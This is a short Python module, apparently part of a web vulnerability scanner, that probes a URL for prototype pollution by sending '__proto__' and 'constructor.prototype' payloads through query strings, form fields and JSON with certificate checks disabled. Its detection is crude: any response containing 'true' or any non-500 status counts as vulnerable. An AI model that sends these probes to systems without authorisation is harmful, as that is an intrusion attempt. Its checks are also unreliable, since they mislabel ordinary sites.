from typing import Optional, Dict
import requests

PP_PAYLOADS = [
    "__proto__[test]=true",
    "__proto__.test=true",
    "constructor[prototype][test]=true",
    "constructor.prototype.test=true",
]

PP_EVIDENCE = [
    "true",
]


def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "type": None, "evidence": []}

    if param:
        for payload in PP_PAYLOADS:
            try:
                sep = "&" if "?" in url else "?"
                r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
                             timeout=timeout, verify=False)
                if "true" in r.text and len(r.text) > 10:
                    result["vulnerable"] = True
                    result["type"] = "get"
                    result["evidence"].append("pp: %s" % payload[:20])
                    break
            except:
                pass

    if not result["vulnerable"]:
        for payload in PP_PAYLOADS:
            try:
                r = sess.post(url, data={param or "__proto__": payload},
                              timeout=timeout, verify=False)
                if r.status_code < 500 and len(r.text) > 10:
                    result["vulnerable"] = True
                    result["type"] = "post"
                    result["evidence"].append("pp post: %s" % payload[:15])
                    break
            except:
                pass

    if not result["vulnerable"]:
        try:
            json_payload = {
                "__proto__": {"test": "true"},
                "constructor": {"prototype": {"test": "true"}}
            }
            r = sess.post(url, json=json_payload, timeout=timeout, verify=False)
            if r.status_code < 500:
                result["vulnerable"] = True
                result["type"] = "json"
                result["evidence"].append("pp json: __proto__ injection")
        except:
            pass

    return result
